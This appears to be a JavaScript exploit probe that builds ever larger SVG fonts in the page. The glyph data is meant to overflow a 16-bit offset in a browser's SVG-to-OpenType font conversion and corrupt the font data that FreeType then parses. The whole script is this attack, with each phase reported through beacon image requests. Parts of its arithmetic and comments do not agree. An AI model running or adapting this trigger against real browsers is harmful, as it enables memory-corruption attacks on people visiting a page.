// p161b — SVG font → OTF Placeholder uint16_t truncation
// The SVGToOTFFontConversion.cpp Placeholder::populate() has ASSERT-only
// check for delta < 65535. In release, delta silently truncates to uint16.
// If we create SVG font with enough glyph data to exceed 64KB offset,
// the generated OTF has corrupted offsets → FreeType parses wrong data.
// Beacon prefix: V161B-

(function() {
  var T0 = Date.now();
  function B(tag) {
    try { new Image().src = '/BEACON?V161B-' + tag + '&t=' + (Date.now() - T0); } catch(e) {}
  }

  B('BOOT');

  // Phase 1: Test if SVG fonts work at all
  B('PHASE1-SVG');

  // Create a minimal SVG font
  var svgNS = 'http://www.w3.org/2000/svg';
  var svg = document.createElementNS(svgNS, 'svg');
  svg.style.display = 'none';
  document.body.appendChild(svg);

  var defs = document.createElementNS(svgNS, 'defs');
  svg.appendChild(defs);

  var font = document.createElementNS(svgNS, 'font');
  font.setAttribute('id', 'TestSVGFont');
  font.setAttribute('horiz-adv-x', '1000');
  defs.appendChild(font);

  var fontFace = document.createElementNS(svgNS, 'font-face');
  fontFace.setAttribute('font-family', 'SVGTest161');
  fontFace.setAttribute('units-per-em', '1000');
  fontFace.setAttribute('ascent', '800');
  fontFace.setAttribute('descent', '-200');
  font.appendChild(fontFace);

  // Missing glyph
  var missingGlyph = document.createElementNS(svgNS, 'missing-glyph');
  missingGlyph.setAttribute('horiz-adv-x', '500');
  missingGlyph.setAttribute('d', 'M0 0L500 0L500 800L0 800Z');
  font.appendChild(missingGlyph);

  // A few test glyphs
  var glyphs = [
    {unicode: 'A', d: 'M0 0L500 800L1000 0L750 0L500 400L250 0Z'},
    {unicode: 'B', d: 'M100 0L100 800L600 800Q900 800 900 600Q900 400 600 400L600 400Q900 400 900 200Q900 0 600 0Z'},
    {unicode: ' ', d: ''}
  ];

  for (var i = 0; i < glyphs.length; i++) {
    var g = document.createElementNS(svgNS, 'glyph');
    g.setAttribute('unicode', glyphs[i].unicode);
    g.setAttribute('horiz-adv-x', '1000');
    if (glyphs[i].d) g.setAttribute('d', glyphs[i].d);
    font.appendChild(g);
  }

  B('SVG-BUILT-' + (3 + 1) + '-GLYPHS');

  // Try to use the SVG font
  var testEl = document.createElement('div');
  testEl.style.fontFamily = 'SVGTest161';
  testEl.style.fontSize = '48px';
  testEl.textContent = 'AB TEST';
  document.body.appendChild(testEl);

  // Check if it renders (measure width)
  setTimeout(function() {
    var w = testEl.offsetWidth;
    B('SVG-RENDER-W' + w);

    // Phase 2: Many glyphs to push offset past 64KB
    phase2();
  }, 500);

  function phase2() {
    B('PHASE2-OVERFLOW');

    // Create a new SVG with MANY complex glyphs
    // Each glyph with a complex path adds to CFF charstring data
    // We need total > 65536 bytes in a section to trigger Placeholder truncation

    var svg2 = document.createElementNS(svgNS, 'svg');
    svg2.style.display = 'none';
    document.body.appendChild(svg2);

    var defs2 = document.createElementNS(svgNS, 'defs');
    svg2.appendChild(defs2);

    var font2 = document.createElementNS(svgNS, 'font');
    font2.setAttribute('id', 'OverflowFont');
    font2.setAttribute('horiz-adv-x', '1000');
    defs2.appendChild(font2);

    var ff2 = document.createElementNS(svgNS, 'font-face');
    ff2.setAttribute('font-family', 'SVGOver161');
    ff2.setAttribute('units-per-em', '1000');
    ff2.setAttribute('ascent', '800');
    ff2.setAttribute('descent', '-200');
    font2.appendChild(ff2);

    var mg2 = document.createElementNS(svgNS, 'missing-glyph');
    mg2.setAttribute('horiz-adv-x', '500');
    font2.appendChild(mg2);

    // Generate many glyphs with complex paths
    // Each glyph path ~200 bytes → 400 glyphs × 200 = ~80KB charstring data
    // This should push a Placeholder offset past 65535
    var GLYPH_COUNT = 500;
    B('BUILDING-' + GLYPH_COUNT + '-GLYPHS');

    for (var i = 0; i < GLYPH_COUNT; i++) {
      var g = document.createElementNS(svgNS, 'glyph');
      // Use Private Use Area codepoints to avoid conflicts
      var cp = 0xE000 + i;
      g.setAttribute('unicode', String.fromCharCode(cp));
      g.setAttribute('horiz-adv-x', '1000');

      // Complex path: many cubic bezier curves
      var d = 'M0 0';
      for (var j = 0; j < 15; j++) {
        var x1 = (j * 67 + i * 13) % 1000;
        var y1 = (j * 89 + i * 31) % 800;
        var x2 = (j * 53 + i * 17) % 1000;
        var y2 = (j * 71 + i * 23) % 800;
        var x3 = (j * 41 + i * 37) % 1000;
        var y3 = (j * 97 + i * 43) % 800;
        d += 'C' + x1 + ' ' + y1 + ' ' + x2 + ' ' + y2 + ' ' + x3 + ' ' + y3;
      }
      d += 'Z';
      g.setAttribute('d', d);
      font2.appendChild(g);

      if (i % 100 === 0) B('G-' + i);
    }

    B('GLYPHS-DONE');

    // Now try to use this font — triggers SVGToOTFFontConversion
    var testEl2 = document.createElement('div');
    testEl2.style.fontFamily = 'SVGOver161';
    testEl2.style.fontSize = '48px';
    // Render some Private Use Area characters
    var text = '';
    for (var i = 0; i < 20; i++) text += String.fromCharCode(0xE000 + i);
    testEl2.textContent = text;
    document.body.appendChild(testEl2);

    setTimeout(function() {
      var w2 = testEl2.offsetWidth;
      B('OVER-RENDER-W' + w2);

      // Phase 3: Even more glyphs — aim for >65KB offset
      phase3();
    }, 1000);
  }

  function phase3() {
    B('PHASE3-BIG');

    // 2000 glyphs with very complex paths
    var svg3 = document.createElementNS(svgNS, 'svg');
    svg3.style.display = 'none';
    document.body.appendChild(svg3);

    var defs3 = document.createElementNS(svgNS, 'defs');
    svg3.appendChild(defs3);

    var font3 = document.createElementNS(svgNS, 'font');
    font3.setAttribute('id', 'BigFont');
    font3.setAttribute('horiz-adv-x', '1000');
    defs3.appendChild(font3);

    var ff3 = document.createElementNS(svgNS, 'font-face');
    ff3.setAttribute('font-family', 'SVGBig161');
    ff3.setAttribute('units-per-em', '1000');
    ff3.setAttribute('ascent', '800');
    ff3.setAttribute('descent', '-200');
    font3.appendChild(ff3);

    var mg3 = document.createElementNS(svgNS, 'missing-glyph');
    mg3.setAttribute('horiz-adv-x', '500');
    font3.appendChild(mg3);

    var BIG_COUNT = 2000;
    B('BIG-' + BIG_COUNT);

    for (var i = 0; i < BIG_COUNT; i++) {
      var g = document.createElementNS(svgNS, 'glyph');
      var cp = 0xE000 + i;
      if (cp > 0xF8FF) cp = 0xF0000 + (i - 0x900); // Supplementary PUA
      if (cp <= 0xFFFF) {
        g.setAttribute('unicode', String.fromCharCode(cp));
      } else {
        // Surrogate pair for supplementary
        var hi = 0xD800 + ((cp - 0x10000) >> 10);
        var lo = 0xDC00 + ((cp - 0x10000) & 0x3FF);
        g.setAttribute('unicode', String.fromCharCode(hi, lo));
      }
      g.setAttribute('horiz-adv-x', '1000');

      // Very complex path: 30 cubic beziers ≈ 400+ bytes per glyph
      var d = 'M0 0';
      for (var j = 0; j < 30; j++) {
        var x1 = (j * 67 + i * 13) % 1000;
        var y1 = (j * 89 + i * 31) % 800;
        var x2 = (j * 53 + i * 17) % 1000;
        var y2 = (j * 71 + i * 23) % 800;
        var x3 = (j * 41 + i * 37) % 1000;
        var y3 = (j * 97 + i * 43) % 800;
        d += 'C' + x1 + ' ' + y1 + ' ' + x2 + ' ' + y2 + ' ' + x3 + ' ' + y3;
      }
      d += 'Z';
      g.setAttribute('d', d);
      font3.appendChild(g);
    }

    B('BIG-BUILT');

    var testEl3 = document.createElement('div');
    testEl3.style.fontFamily = 'SVGBig161';
    testEl3.style.fontSize = '48px';
    var t3 = '';
    for (var i = 0; i < 20; i++) t3 += String.fromCharCode(0xE000 + i);
    testEl3.textContent = t3;
    document.body.appendChild(testEl3);

    setTimeout(function() {
      var w3 = testEl3.offsetWidth;
      B('BIG-RENDER-W' + w3);
      B('DONE');
    }, 2000);
  }
})();
